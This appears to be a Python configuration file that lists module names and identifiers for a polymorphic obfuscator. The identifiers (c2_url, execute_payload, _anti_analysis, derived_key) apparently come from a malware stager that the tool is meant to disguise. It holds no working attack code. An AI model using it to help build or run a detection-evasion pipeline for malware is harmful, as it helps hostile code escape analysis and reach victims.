# This file contains dictionaries of high-risk keywords for polymorphic obfuscation.

# Modules that need to be imported with an alias
MODULE_IMPORTS = {
    "types": "",
    "ssl": "",
    "base64": "",
    "zlib": "",
    "socket": "",
    "ssl": "", # Added for TLS detection in payloads
    "os": "",
    "sys": "",
    "time": "",
    "ctypes": "",
    "uuid": "",
    "hashlib": "",
}

# Other identifiers (variables, functions, classes) that get direct replacement
IDENTIFIERS = {
    "self": "",
    "host": "",
    "port": "",
    "key": "",
    "aes_key": "",
    "c2_url": "",
    "Stager": "",
    "client_socket": "",
    "receive_payload": "",
    "execute_payload": "",
    "cleanup": "",
    "_recv_all": "",
    "_anti_analysis": "",
    "_get_mac_address": "",
    "raw_socket": "", # Local variable
    "ssl_context": "", # Local variable
    "payload_data": "", # Local variable
    "obfuscated_payload": "", # Argument name
    "decoded_payload": "", # Local variable
    "decrypted_payload": "", # Local variable
    "decompressed_payload": "", # Local variable
    "module_name": "", # Local variable
    "payload_module": "", # Local variable
    "compiled_code": "", # Local variable
    "mac_address": "", # Local variable
    "composite_salt": "", # Local variable
    "master_key": "", # Local variable
    "derived_key": "", # Local variable
}
